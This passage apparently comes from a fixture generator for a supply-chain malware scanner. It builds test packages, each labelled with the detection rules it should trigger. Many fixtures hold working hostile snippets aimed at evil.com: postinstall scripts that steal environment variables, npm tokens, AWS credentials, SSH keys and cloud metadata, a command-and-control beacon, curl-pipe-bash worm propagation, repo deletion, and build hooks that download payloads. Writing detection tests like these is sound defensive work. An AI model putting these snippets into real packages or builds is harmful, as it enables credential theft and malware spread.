            "main.go": "//go:generate wget http://evil.com/payload\npackage main\nfunc main() {}\n",
        },
        "desc": "Go module with download in go:generate (fires L2-BUILD-001).",
        "rules": ["L2-BUILD-001"],
    },
    {
        "name": "maven_exec_plugin",
        "files": {
            "pom.xml": """<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0">
  <modelVersion>4.0.0</modelVersion>
  <groupId>com.evil</groupId>
  <artifactId>evil-exec</artifactId>
  <version>1.0.0</version>
  <build>
    <plugins>
      <plugin>
        <groupId>org.codehaus.mojo</groupId>
        <artifactId>exec-maven-plugin</artifactId>
        <version>3.1.0</version>
        <executions>
          <execution>
            <goals><goal>exec</goal></goals>
            <configuration>
              <executable>curl</executable>
              <arguments><argument>evil.com</argument></arguments>
            </configuration>
          </execution>
        </executions>
      </plugin>
    </plugins>
  </build>
</project>
""",
        },
        "desc": "Maven project with exec-maven-plugin running curl (fires L2-BUILD-001).",
        "rules": ["L2-BUILD-001"],
    },
    {
        "name": "maven_exec_shell",
        "files": {
            "pom.xml": """<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0">
  <modelVersion>4.0.0</modelVersion>
  <groupId>com.evil</groupId>
  <artifactId>evil-shell</artifactId>
  <version>1.0.0</version>
  <build>
    <plugins>
      <plugin>
        <groupId>org.codehaus.mojo</groupId>
        <artifactId>exec-maven-plugin</artifactId>
        <version>3.1.0</version>
        <executions>
          <execution>
            <goals><goal>exec</goal></goals>
            <configuration>
              <executable>bash</executable>
              <arguments><argument>-c</argument><argument>curl evil.com</argument></arguments>
            </configuration>
          </execution>
        </executions>
      </plugin>
    </plugins>
  </build>
</project>
""",
        },
        "desc": "Maven project with exec-maven-plugin running shell command (fires L2-BUILD-001).",
        "rules": ["L2-BUILD-001"],
    },
    {
        "name": "nuget_msbuild_target",
        "files": {
            "EvilNuGet.csproj": """<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <TargetFramework>net8.0</TargetFramework>
    <PackageId>EvilNuGet</PackageId>
    <Version>1.0.0</Version>
  </PropertyGroup>
  <Target Name="PostBuild" AfterTargets="Build">
    <Exec Command="curl evil.com" />
  </Target>
</Project>
""",
        },
        "desc": "NuGet package with MSBuild target executing curl (fires L2-BUILD-001).",
        "rules": ["L2-BUILD-001"],
    },
    {
        "name": "nuget_msbuild_download",
        "files": {
            "EvilNuGet.csproj": """<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <TargetFramework>net8.0</TargetFramework>
    <PackageId>EvilNuGet</PackageId>
    <Version>1.0.0</Version>
  </PropertyGroup>
  <Target Name="DownloadPayload" BeforeTargets="Build">
    <Exec Command="powershell -Command Invoke-WebRequest -Uri http://evil.com/payload -OutFile payload.exe" />
  </Target>
</Project>
""",
        },
        "desc": "NuGet package with MSBuild target downloading payload (fires L2-BUILD-001).",
        "rules": ["L2-BUILD-001"],
    },
    {
        "name": "rubygems_extconf_exec",
        "files": {
            "evil_gem.gemspec": """Gem::Specification.new do |s|
  s.name = "evil_gem"
  s.version = "0.1.0"
  s.summary = "Evil gem"
  s.extensions = ["ext/extconf.rb"]
  s.authors = ["Evil Author"]
end
""",
            "ext/extconf.rb": "require 'mkmf'\nsystem('curl evil.com')\ncreate_makefile('evil_extension')\n",
        },
        "desc": "RubyGem with extconf.rb executing system command (fires L2-BUILD-001).",
        "rules": ["L2-BUILD-001"],
    },
    {
        "name": "rubygems_extconf_download",
        "files": {
            "evil_gem.gemspec": """Gem::Specification.new do |s|
  s.name = "evil_gem_dl"
  s.version = "0.1.0"
  s.summary = "Evil gem"
  s.extensions = ["ext/extconf.rb"]
  s.authors = ["Evil Author"]
end
""",
            "ext/extconf.rb": "require 'mkmf'\n`wget http://evil.com/payload`\ncreate_makefile('evil_extension')\n",
        },
        "desc": "RubyGem with extconf.rb downloading payload (fires L2-BUILD-001).",
        "rules": ["L2-BUILD-001"],
    },
]


def generate_postinstall_fixtures():
    count = 0
    for pat in POSTINSTALL_PATTERNS:
        dirname = pat["name"]
        if os.path.exists(os.path.join(POSITIVE_DIR, dirname)):
            continue
        write_fixture(
            os.path.join(POSITIVE_DIR, dirname),
            pat["files"],
            {
                "label": "positive",
                "description": pat["desc"],
                "expected_rule_ids": pat["rules"],
            },
        )
        count += 1
    return count


# ─── CREDENTIAL / NETWORK EXFIL GENERATORS ──────────────────────────────

CREDENTIAL_PATTERNS = [
    {
        "name": "netex_env_exfil_postinstall",
        "files": {
            "package.json": json.dumps(
                {"name": "env-exfil", "version": "1.0.0", "scripts": {"postinstall": "node exfil.js"}}, indent=2
            ),
            "exfil.js": "const http = require('http'); const data = JSON.stringify({env: process.env}); const req = http.request({hostname: 'evil.com', port: 80, path: '/exfil', method: 'POST'}); req.write(data); req.end();\n",
        },
        "desc": "npm package exfiltrating environment variables (fires L2-POST-001, L2-NETEX-001).",
        "rules": ["L2-POST-001", "L2-NETEX-001"],
    },
    {
        "name": "netex_imds_postinstall",
        "files": {
            "package.json": json.dumps(
                {"name": "imds-exfil", "version": "1.0.0", "scripts": {"postinstall": "node imds.js"}}, indent=2
            ),
            "imds.js": "const http = require('http'); http.get('http://169.254.169.254/latest/meta-data/iam/security-credentials/', (res) => { let d=''; res.on('data', c => d+=c); res.on('end', () => { http.post({hostname:'evil.com', path:'/exfil'}, d); }); });\n",
        },
        "desc": "npm package accessing IMDS metadata (fires L2-POST-001, L2-NETEX-001).",
        "rules": ["L2-POST-001", "L2-NETEX-001"],
    },
    {
        "name": "netex_c2_shai_hulud",
        "files": {
            "package.json": json.dumps(
                {"name": "c2-shai", "version": "1.0.0", "scripts": {"postinstall": "node c2.js"}}, indent=2
            ),
            "c2.js": "const net = require('net'); setInterval(() => { const c = net.connect(4444, 'c2.evil.com'); c.write(JSON.stringify({host: require('os').hostname()})); c.end(); }, 60000);\n",
        },
        "desc": "npm package with C2 beacon (fires L2-POST-001, L2-NETEX-001).",
        "rules": ["L2-POST-001", "L2-NETEX-001"],
    },
    {
        "name": "credential_read_npmrc",
        "files": {
            "package.json": json.dumps(
                {"name": "cred-npmrc", "version": "1.0.0", "scripts": {"postinstall": "node steal.js"}}, indent=2
            ),
            "steal.js": "const fs = require('fs'); const npmrc = fs.readFileSync('.npmrc', 'utf8'); const token = process.env.NPM_TOKEN; require('http').get(`http://evil.com/steal?token=${token}&npmrc=${encodeURIComponent(npmrc)}`);\n",
        },
        "desc": "npm package reading .npmrc and NPM_TOKEN (fires L2-POST-001, L2-CRED-001).",
        "rules": ["L2-POST-001", "L2-CRED-001"],
    },
    {
        "name": "credential_read_aws",
        "files": {
            "package.json": json.dumps(
                {"name": "cred-aws", "version": "1.0.0", "scripts": {"postinstall": "node steal.js"}}, indent=2
            ),
            "steal.js": "const fs = require('fs'); const creds = fs.readFileSync(process.env.HOME + '/.aws/credentials', 'utf8'); require('http').get(`http://evil.com/steal?creds=${encodeURIComponent(creds)}`);\n",
        },
        "desc": "npm package reading AWS credentials (fires L2-POST-001, L2-CRED-001).",
        "rules": ["L2-POST-001", "L2-CRED-001"],
    },
    {
        "name": "credential_read_ssh",
        "files": {
            "package.json": json.dumps(
                {"name": "cred-ssh", "version": "1.0.0", "scripts": {"postinstall": "node steal.js"}}, indent=2
            ),
            "steal.js": "const fs = require('fs'); const key = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8'); require('http').get(`http://evil.com/steal?key=${encodeURIComponent(key)}`);\n",
        },
        "desc": "npm package reading SSH private key (fires L2-POST-001, L2-CRED-001).",
        "rules": ["L2-POST-001", "L2-CRED-001"],
    },
]


def generate_credential_fixtures():
    count = 0
    for pat in CREDENTIAL_PATTERNS:
        dirname = pat["name"]
        if os.path.exists(os.path.join(POSITIVE_DIR, dirname)):
            continue
        write_fixture(
            os.path.join(POSITIVE_DIR, dirname),
            pat["files"],
            {
                "label": "positive",
                "description": pat["desc"],
                "expected_rule_ids": pat["rules"],
            },
        )
        count += 1
    return count


# ─── WORM / PROPAGATION GENERATORS ─────────────────────────────────────

WORM_PATTERNS = [
    {
        "name": "worm_propagation_npm",
        "files": {
            "package.json": json.dumps(
                {"name": "worm-npm", "version": "1.0.0", "scripts": {"postinstall": "node worm.js"}}, indent=2
            ),
            "worm.js": "require('child_process').execSync('npm publish'); require('child_process').execSync('curl -s http://evil.com/worm.sh | bash');\n",
        },
        "desc": "npm package with worm propagation via npm publish + curl|sh (fires L2-POST-001, L2-WORM-001).",
        "rules": ["L2-POST-001", "L2-WORM-001"],
    },
    {
        "name": "worm_self_modify_package_json",
        "files": {
            "package.json": json.dumps(
                {"name": "worm-selfmod", "version": "1.0.0", "scripts": {"postinstall": "node worm.js"}}, indent=2
            ),
            "worm.js": "const fs = require('fs'); const pkg = JSON.parse(fs.readFileSync('package.json')); pkg.scripts.postinstall = 'node worm.js && curl http://evil.com/worm.sh | bash'; fs.writeFileSync('package.json', JSON.stringify(pkg, null, 2));\n",
        },
        "desc": "npm package with self-modifying package.json (fires L2-POST-001, L2-WORM-001).",
        "rules": ["L2-POST-001", "L2-WORM-001"],
    },
    {
        "name": "worm_github_workflow_delete",
        "files": {
            "package.json": json.dumps(
                {"name": "worm-gh", "version": "1.0.0", "scripts": {"postinstall": "node worm.js"}}, indent=2
            ),
            "worm.js": "require('child_process').execSync('gh repo delete current-repo --confirm'); require('child_process').execSync('curl http://evil.com/worm.sh | bash');\n",
        },
        "desc": "npm package with GitHub repo deletion + worm (fires L2-POST-001, L2-WORM-001).",
        "rules": ["L2-POST-001", "L2-WORM-001"],
    },
]


def generate_worm_fixtures():
    count = 0
    for pat in WORM_PATTERNS:
        dirname = pat["name"]
        if os.path.exists(os.path.join(POSITIVE_DIR, dirname)):
            continue
        write_fixture(
            os.path.join(POSITIVE_DIR, dirname),
            pat["files"],
            {
                "label": "positive",
                "description": pat["desc"],
                "expected_rule_ids": pat["rules"],
            },
        )
        count += 1
    return count


# ─── DEPENDENCY CONFUSION GENERATORS ────────────────────────────────────

DEPC_PATTERNS = [
    {
        "name": "depc_npm_internal_billing",
        "files": {
            "package.json": json.dumps(
                {"name": "my-app", "version": "1.0.0", "dependencies": {"@company/billing": "^1.0.0"}}, indent=2
            ),
        },
        "desc": "npm package with internal @company/billing dep without private registry config (fires L2-DEPC-001).",
        "rules": ["L2-DEPC-001"],
    },
    {
        "name": "depc_npm_internal_payments",
        "files": {
            "package.json": json.dumps(
                {"name": "my-app", "version": "1.0.0", "dependencies": {"@acme/payments": "^2.0.0"}}, indent=2
            ),
        },
        "desc": "npm package with internal @acme/payments dep without private registry (fires L2-DEPC-001).",
        "rules": ["L2-DEPC-001"],
    },
    {
        "name": "depc_npm_private_auth",
        "files": {
            "package.json": json.dumps(
                {"name": "my-app", "version": "1.0.0", "dependencies": {"@internal/auth": "^1.0.0"}}, indent=2
            ),
        },
        "desc": "npm package with @internal/auth dep without private registry (fires L2-DEPC-001).",
        "rules": ["L2-DEPC-001"],
    },
    {
        "name": "depc_pypi_company_billing",
        "files": {
            "setup.py": 'from setuptools import setup\nsetup(name="my-app", version="1.0.0", install_requires=["company-billing>=1.0.0"])\n',
        },
        "desc": "PyPI package depending on company-billing without private index (fires L2-PYPI-DEPC-001).",
        "rules": ["L2-PYPI-DEPC-001"],
    },
    {
        "name": "depc_pypi_corp_utils",
        "files": {
            "setup.py": 'from setuptools import setup\nsetup(name="my-app", version="1.0.0", install_requires=["corp-utils>=0.5.0"])\n',
        },
        "desc": "PyPI package depending on corp-utils without private index (fires L2-PYPI-DEPC-001).",
        "rules": ["L2-PYPI-DEPC-001"],
    },
    {
        "name": "depc_pypi_org_payments",
        "files": {
            "setup.py": 'from setuptools import setup\nsetup(name="my-app", version="1.0.0", install_requires=["org-payments>=3.0.0"])\n',
        },
        "desc": "PyPI package depending on org-payments without private index (fires L2-PYPI-DEPC-001).",
        "rules": ["L2-PYPI-DEPC-001"],
    },
    {
        "name": "depc_go_acme_billing",
        "files": {
            "go.mod": "module my-app\ngo 1.21\nrequire acme-billing v1.0.0\n",
            "main.go": 'package main\nimport _ "acme-billing"\nfunc main() {}\n',
        },
        "desc": "Go module depending on acme-billing without private proxy (fires L2-GO-DEPC-001).",
        "rules": ["L2-GO-DEPC-001"],
    },
    {
        "name": "depc_go_corp_utils",
        "files": {
            "go.mod": "module my-app\ngo 1.21\nrequire corp-utils v0.5.0\n",
            "main.go": 'package main\nimport _ "corp-utils"\nfunc main() {}\n',
        },
        "desc": "Go module depending on corp-utils without private proxy (fires L2-GO-DEPC-001).",
        "rules": ["L2-GO-DEPC-001"],
    },
    {
        "name": "depc_go_org_payments",
        "files": {
            "go.mod": "module my-app\ngo 1.21\nrequire org-payments v3.0.0\n",
            "main.go": 'package main\nimport _ "org-payments"\nfunc main() {}\n',
        },
        "desc": "Go module depending on org-payments without private proxy (fires L2-GO-DEPC-001).",
        "rules": ["L2-GO-DEPC-001"],
    },
    {
        "name": "depc_cargo_company_billing",
        "files": {
            "Cargo.toml": '[package]\nname = "my-app"\nversion = "0.1.0"\n[dependencies]\ncompany-billing = "1.0"\n',
            "src/lib.rs": 'pub fn hello() -> &\'static str { "hello" }\n',
        },
        "desc": "Cargo crate depending on company-billing without private registry (fires L2-CARGO-DEPC-001).",
        "rules": ["L2-CARGO-DEPC-001"],
    },
    {
        "name": "depc_cargo_corp_utils",
        "files": {
            "Cargo.toml": '[package]\nname = "my-app"\nversion = "0.1.0"\n[dependencies]\ncorp-utils = "0.5"\n',
            "src/lib.rs": 'pub fn hello() -> &\'static str { "hello" }\n',
        },
        "desc": "Cargo crate depending on corp-utils without private registry (fires L2-CARGO-DEPC-001).",
        "rules": ["L2-CARGO-DEPC-001"],
    },
    {
        "name": "depc_cargo_org_payments",
        "files": {
            "Cargo.toml": '[package]\nname = "my-app"\nversion = "0.1.0"\n[dependencies]\norg-payments = "3.0"\n',
            "src/lib.rs": 'pub fn hello() -> &\'static str { "hello" }\n',
        },
        "desc": "Cargo crate depending on org-payments without private registry (fires L2-CARGO-DEPC-001).",
        "rules": ["L2-CARGO-DEPC-001"],
    },
    {
        "name": "depc_maven_acme_billing",
        "files": {
            "pom.xml": """<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0">
  <modelVersion>4.0.0</modelVersion>
  <groupId>com.myapp</groupId>
  <artifactId>my-app</artifactId>
  <version>1.0.0</version>
  <dependencies>
    <dependency><groupId>com.acme</groupId><artifactId>billing</artifactId><version>1.0.0</version></dependency>
  </dependencies>
</project>
""",
        },
        "desc": "Maven project depending on com.acme:billing without private repo (fires L2-MAVEN-DEPC-001).",
        "rules": ["L2-MAVEN-DEPC-001"],
    },
    {
        "name": "depc_maven_corp_utils",
        "files": {
            "pom.xml": """<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0">
  <modelVersion>4.0.0</modelVersion>
  <groupId>com.myapp</groupId>
  <artifactId>my-app</artifactId>
  <version>1.0.0</version>
  <dependencies>
    <dependency><groupId>com.corp</groupId><artifactId>utils</artifactId><version>0.5.0</version></dependency>
  </dependencies>
</project>
""",
        },
        "desc": "Maven project depending on com.corp:utils without private repo (fires L2-MAVEN-DEPC-001).",
        "rules": ["L2-MAVEN-DEPC-001"],
    },
    {
        "name": "depc_maven_org_payments",
        "files": {
            "pom.xml": """<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0">
  <modelVersion>4.0.0</modelVersion>
  <groupId>com.myapp</groupId>
  <artifactId>my-app</artifactId>
  <version>1.0.0</version>
  <dependencies>
    <dependency><groupId>com.org</groupId><artifactId>payments</artifactId><version>3.0.0</version></dependency>
  </dependencies>
</project>
""",
        },
        "desc": "Maven project depending on com.org:payments without private repo (fires L2-MAVEN-DEPC-001).",
        "rules": ["L2-MAVEN-DEPC-001"],
    },
    {
        "name": "depc_nuget_acme_billing",
        "files": {
            "AcmeBilling.csproj": """<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <TargetFramework>net8.0</TargetFramework>
    <PackageId>AcmeBilling</PackageId>
    <Version>1.0.0</Version>
  </PropertyGroup>
  <ItemGroup>
    <PackageReference Include="Acme.Billing" Version="1.0.0" />
  </ItemGroup>
</Project>
""",
        },
        "desc": "NuGet package depending on Acme.Billing without private source (fires L2-NUGET-DEPC-001).",
        "rules": ["L2-NUGET-DEPC-001"],
    },
    {
        "name": "depc_nuget_corp_internal",
        "files": {
            "CorpInternal.csproj": """<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <TargetFramework>net8.0</TargetFramework>
    <PackageId>CorpInternal</PackageId>
    <Version>1.0.0</Version>
  </PropertyGroup>
  <ItemGroup>
    <PackageReference Include="Corp.Internal" Version="0.5.0" />
  </ItemGroup>
</Project>
""",
        },
        "desc": "NuGet package depending on Corp.Internal without private source (fires L2-NUGET-DEPC-001).",
        "rules": ["L2-NUGET-DEPC-001"],
    },
    {
        "name": "depc_nuget_org_payments",
        "files": {
            "OrgPayments.csproj": """<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <TargetFramework>net8.0</TargetFramework>
    <PackageId>OrgPayments</PackageId>
    <Version>1.0.0</Version>
  </PropertyGroup>
  <ItemGroup>
    <PackageReference Include="Org.Payments" Version="3.0.0" />
  </ItemGroup>
</Project>
""",
        },
        "desc": "NuGet package depending on Org.Payments without private source (fires L2-NUGET-DEPC-001).",
        "rules": ["L2-NUGET-DEPC-001"],
    },
    {
        "name": "depc_rubygems_internal",
        "files": {
            "Gemfile": "source 'https://rubygems.org'\ngem 'internal-gem'\n",
            "my_app.gemspec": """Gem::Specification.new do |s|
  s.name = "my_app"
  s.version = "0.1.0"
  s.add_dependency "internal-gem"
  s.authors = ["Dev"]
end
""",
        },
        "desc": "RubyGem depending on internal-gem without private gem server (fires L2-RUBYGEMS-DEPC-001).",
        "rules": ["L2-RUBYGEMS-DEPC-001"],
    },
]


def generate_dep_confusion_fixtures():
    count = 0
    for pat in DEPC_PATTERNS:
        dirname = pat["name"]
        if os.path.exists(os.path.join(POSITIVE_DIR, dirname)):
            continue
        write_fixture(
            os.path.join(POSITIVE_DIR, dirname),
            pat["files"],
            {
                "label": "positive",
                "description": pat["desc"],
                "expected_rule_ids": pat["rules"],
            },
        )
        count += 1
    return count


# ─── MANIFEST / LOCKFILE ISSUE GENERATORS ───────────────────────────────

MANIFEST_PATTERNS = [
    {
        "name": "mani_latest_tag",
        "files": {
            "package.json": json.dumps(
                {"name": "sloppy-pkg", "version": "1.0.0", "dependencies": {"express": "latest"}}, indent=2
            ),
        },
        "desc": "npm package with 'latest' version range (fires L2-MANI-001).",
        "rules": ["L2-MANI-001"],
    },
    {
        "name": "mani_optional_dep_lifecycle",
        "files": {
            "package.json": json.dumps(
                {"name": "optional-lifecycle", "version": "1.0.0", "optionalDependencies": {"evil-hook": "^1.0.0"}},
                indent=2,
            ),
        },
        "desc": "npm package with optional dependency that has lifecycle scripts (fires L2-MANI-002).",
        "rules": ["L2-MANI-002"],
    },
    {
        "name": "missing_lockfile_npm",
        "files": {
            "package.json": json.dumps(
                {"name": "no-lock", "version": "1.0.0", "dependencies": {"express": "^4.18.0"}}, indent=2
            ),
        },
        "desc": "npm package without lockfile (fires L2-LOCK-001).",
        "rules": ["L2-LOCK-001"],
    },
    {
        "name": "missing_repo_npm",
        "files": {
            "package.json": json.dumps(
                {"name": "no-repo", "version": "1.0.0", "description": "A package with no repository field"}, indent=2
            ),
        },
        "desc": "npm package without repository field (fires L2-PROV-001).",
        "rules": ["L2-PROV-001"],
    },
    {
        "name": "loose_engine_constraint_npm",
        "files": {
            "package.json": json.dumps(
                {"name": "loose-engines", "version": "1.0.0", "engines": {"node": "*"}}, indent=2
            ),
        },
        "desc": "npm package with overly permissive engine constraint (fires L2-ENGIN-001).",
        "rules": ["L2-ENGIN-001"],
    },
    {
        "name": "loose_manifest_npm",
        "files": {
            "package.json": json.dumps(
                {"name": "loose-manifest", "version": "1.0.0", "dependencies": {"express": "x"}}, indent=2
            ),
        },
        "desc": "npm package with 'x' version range (fires L2-MANI-001).",
        "rules": ["L2-MANI-001"],
    },
    {
        "name": "unlicensed_npm_package",
        "files": {
            "package.json": json.dumps(
                {"name": "unlicensed", "version": "1.0.0", "description": "No license field"}, indent=2
            ),
        },
        "desc": "npm package without license field (fires L2-LICENSE-001).",
        "rules": ["L2-LICENSE-001"],
    },
    {
        "name": "license_see_license_in_license",
        "files": {
            "package.json": json.dumps(
                {"name": "see-license", "version": "1.0.0", "license": "SEE LICENSE IN LICENSE"}, indent=2
            ),
        },
        "desc": "npm package with non-standard license reference (fires L2-LICENSE-001).",
        "rules": ["L2-LICENSE-001"],
    },
    {
        "name": "license_missing",
        "files": {
            "package.json": json.dumps({"name": "no-license", "version": "1.0.0"}, indent=2),
        },
        "desc": "npm package with no license field at all (fires L2-LICENSE-001).",
        "rules": ["L2-LICENSE-001"],
    },
    {
        "name": "npm_engin_typo",
        "files": {
            "package.json": json.dumps(
                {"name": "engin-typo", "version": "1.0.0", "engines": {"node": ">= 0.10"}}, indent=2
            ),
        },
        "desc": "npm package with suspiciously low engine constraint (fires L2-ENGIN-001).",
        "rules": ["L2-ENGIN-001"],
    },
    {
        "name": "prov_non_github_repo",
        "files": {
            "package.json": json.dumps(
                {
                    "name": "non-github",
                    "version": "1.0.0",
                    "repository": {"type": "git", "url": "git+https://bitbucket.org/example/pkg.git"},
                },
                indent=2,
            ),
        },
        "desc": "npm package with non-GitHub repository (fires L2-PROV-001).",
        "rules": ["L2-PROV-001"],
    },
    {
        "name": "fork_drift_personal_repo",
        "files": {
            "package.json": json.dumps(
                {
                    "name": "fork-drift",
                    "version": "1.0.0",
                    "repository": {"type": "git", "url": "git+https://github.com/personal-user/fork-drift.git"},
                },
                indent=2,
            ),
        },
        "desc": "npm package in personal repo without fork indicators (fires L2-FORK-001).",
        "rules": ["L2-FORK-001"],
    },
    {
        "name": "fork_patched_named",
        "files": {
            "package.json": json.dumps(
                {
                    "name": "patched-fork",
                    "version": "1.0.0",
                    "repository": {"type": "git", "url": "git+https://github.com/attacker/patched-fork.git"},
                },
                indent=2,
            ),
        },
        "desc": "npm package with suspicious fork naming (fires L2-FORK-001).",
        "rules": ["L2-FORK-001"],
    },
    {
        "name": "maint_single_maintainer_postinstall",
        "files": {
            "package.json": json.dumps(
                {"name": "single-maint", "version": "1.0.0", "scripts": {"postinstall": "node install.js"}}, indent=2
            ),
            "install.js": "console.log('installing...');\n",
        },
        "desc": "npm package with single maintainer and postinstall script (fires L2-MAINT-001).",
        "rules": ["L2-MAINT-001"],
    },
    {
        "name": "bundled_alt_spelling",
        "files": {
            "package.json": json.dumps(
                {"name": "bundled-alt", "version": "1.0.0", "bundledDependencies": ["alt-spelling-pkg"]}, indent=2
            ),
        },
        "desc": "npm package with bundledDependencies (fires L2-BUND-001).",
        "rules": ["L2-BUND-001"],
    },
    {
        "name": "pnpm_overrides_github",
        "files": {
            "package.json": json.dumps(
                {
                    "name": "pnpm-override",
                    "version": "1.0.0",
                    "pnpm": {"overrides": {"express": "github:user/express"}},
                },
                indent=2,
            ),
        },
        "desc": "pnpm package with GitHub override (fires L2-PNPM-001).",
        "rules": ["L2-PNPM-001"],
    },
    {
        "name": "pnpm_proto_pollution_hook",
        "files": {
            "package.json": json.dumps(
                {"name": "pnpm-hook", "version": "1.0.0", "pnpm": {"onlyBuiltDependencies": ["evil-hook"]}}, indent=2
            ),
        },
        "desc": "pnpm package with onlyBuiltDependencies allowing dangerous hooks (fires L2-PNPM-001).",
        "rules": ["L2-PNPM-001"],
    },
    {
        "name": "lockfile_malformed",
        "files": {
            "package.json": json.dumps(
                {"name": "bad-lock", "version": "1.0.0", "dependencies": {"express": "^4.18.0"}}, indent=2
            ),
            "package-lock.json": json.dumps(
                {"name": "bad-lock", "lockfileVersion": 3, "packages": {}, "dependencies": {}}
            ),
        },
        "desc": "npm package with malformed lockfile (fires L2-LOCK-001).",
        "rules": ["L2-LOCK-001"],
    },
    {
        "name": "sideload_git_protocol",
        "files": {
            "package.json": json.dumps(
                {
                    "name": "git-dep",
                    "version": "1.0.0",
                    "dependencies": {"private-pkg": "git://github.com/user/private-pkg.git"},
                },
                indent=2,
            ),
        },
        "desc": "npm package with git:// protocol dependency (fires L2-SIDELOAD-001).",
        "rules": ["L2-SIDELOAD-001"],
    },
    {
        "name": "sideload_file_protocol",
        "files": {
            "package.json": json.dumps(
                {"name": "file-dep", "version": "1.0.0", "dependencies": {"local-pkg": "file:./local-pkg"}}, indent=2
            ),
        },
        "desc": "npm package with file: protocol dependency (fires L2-SIDELOAD-001).",
        "rules": ["L2-SIDELOAD-001"],
    },
    {
        "name": "sideload_github_direct",
        "files": {
            "package.json": json.dumps(
                {"name": "gh-dep", "version": "1.0.0", "dependencies": {"user-pkg": "github:user/pkg"}}, indent=2
            ),
        },
        "desc": "npm package with github: protocol dependency (fires L2-SIDELOAD-001).",
        "rules": ["L2-SIDELOAD-001"],
    },
    {
        "name": "anonymous_npm_with_postinstall",
        "files": {
            "package.json": json.dumps(
                {"name": "anon-postinstall", "version": "1.0.0", "scripts": {"postinstall": "node install.js"}},
                indent=2,
            ),
            "install.js": "console.log('anonymous install');\n",
        },
        "desc": "npm package with no author and postinstall script (fires L2-MAINT-001).",
        "rules": ["L2-MAINT-001"],
    },
]


def generate_manifest_fixtures():
    count = 0
    for pat in MANIFEST_PATTERNS:
        dirname = pat["name"]
        if os.path.exists(os.path.join(POSITIVE_DIR, dirname)):
            continue
        write_fixture(
            os.path.join(POSITIVE_DIR, dirname),
            pat["files"],
            {
                "label": "positive",
                "description": pat["desc"],
                "expected_rule_ids": pat["rules"],
            },
        )
        count += 1
    return count


# ─── CVE / ADVISORY GENERATORS ───────────────────────────────────────────

CVE_PATTERNS = [
    {
        "name": "cve_npm_lodash_range_overlap",
        "files": {
            "package.json": json.dumps(
                {"name": "cve-lodash", "version": "1.0.0", "dependencies": {"lodash": "^4.17.15"}}, indent=2
            ),
        },
        "desc": "npm package with lodash version in CVE range (fires L2-ADV-001).",
        "rules": ["L2-ADV-001"],
    },
    {
        "name": "cve_npm_lodash_transitive",
        "files": {
            "package.json": json.dumps(
                {"name": "cve-lodash-trans", "version": "1.0.0", "dependencies": {"express": "^4.18.0"}}, indent=2
            ),
            "package-lock.json": json.dumps(
                {
                    "name": "cve-lodash-trans",
                    "lockfileVersion": 3,
                    "packages": {"node_modules/lodash": {"version": "4.17.15"}},
                    "dependencies": {"lodash": {"version": "4.17.15"}},
                }
            ),
        },
        "desc": "npm package with lodash transitive dependency in CVE range (fires L2-ADV-001).",
        "rules": ["L2-ADV-001"],
    },
    {
        "name": "cve_pypi_django_range_overlap",
        "files": {
            "setup.py": 'from setuptools import setup\nsetup(name="cve-django", version="1.0.0", install_requires=["django>=3.2,<4.0"])\n',
        },
        "desc": "PyPI package with Django version in CVE range (fires L2-PYPI-ADV-001).",
        "rules": ["L2-PYPI-ADV-001"],
    },
    {
        "name": "cve_pypi_django_transitive",
        "files": {
            "setup.py": 'from setuptools import setup\nsetup(name="cve-django-trans", version="1.0.0", install_requires=["django-rest-framework>=3.0"])\n',
        },
        "desc": "PyPI package with transitive Django dependency in CVE range (fires L2-PYPI-ADV-001).",
        "rules": ["L2-PYPI-ADV-001"],
    },
    {
        "name": "cve_go_jwt_range_overlap",
        "files": {
            "go.mod": "module cve-jwt\ngo 1.21\nrequire github.com/golang-jwt/jwt v4.5.0\n",
            "main.go": "package main\nfunc main() {}\n",
        },
        "desc": "Go module with golang-jwt in CVE range (fires L2-GO-ADV-001).",
        "rules": ["L2-GO-ADV-001"],
    },
    {
        "name": "cve_go_jwt_transitive",
        "files": {
            "go.mod": "module cve-jwt-trans\ngo 1.21\nrequire github.com/gin-gonic/gin v1.9.0\n",
            "main.go": "package main\nfunc main() {}\n",
        },
        "desc": "Go module with transitive jwt dependency in CVE range (fires L2-GO-ADV-001).",
        "rules": ["L2-GO-ADV-001"],
    },
    {
        "name": "cve_cargo_serde_range_overlap",
        "files": {
            "Cargo.toml": '[package]\nname = "cve-serde"\nversion = "0.1.0"\n[dependencies]\nserde = "1.0.150"\n',
            "src/lib.rs": 'pub fn hello() -> &\'static str { "hello" }\n',
        },
        "desc": "Cargo crate with serde in CVE range (fires L2-CARGO-ADV-001).",
        "rules": ["L2-CARGO-ADV-001"],
    },
    {
        "name": "cve_cargo_serde_transitive",
        "files": {
            "Cargo.toml": '[package]\nname = "cve-serde-trans"\nversion = "0.1.0"\n[dependencies]\ntokio = "1.0"\n',
            "src/lib.rs": 'pub fn hello() -> &\'static str { "hello" }\n',
        },
        "desc": "Cargo crate with transitive serde dependency in CVE range (fires L2-CARGO-ADV-001).",
        "rules": ["L2-CARGO-ADV-001"],
    },
    {
        "name": "cve_maven_log4j_range_overlap",
        "files": {
            "pom.xml": """<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0">
  <modelVersion>4.0.0</modelVersion>
  <groupId>com.example</groupId>
  <artifactId>cve-log4j</artifactId>
  <version>1.0.0</version>
  <dependencies>
    <dependency><groupId>org.apache.logging.log4j</groupId><artifactId>log4j-core</artifactId><version>2.14.0</version></dependency>
  </dependencies>
</project>
""",
        },
        "desc": "Maven project with log4j in CVE range (fires L2-MAVEN-ADV-001).",
        "rules": ["L2-MAVEN-ADV-001"],
    },
    {
        "name": "cve_maven_log4j_transitive",
        "files": {
            "pom.xml": """<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0">
  <modelVersion>4.0.0</modelVersion>
  <groupId>com.example</groupId>
  <artifactId>cve-log4j-trans</artifactId>
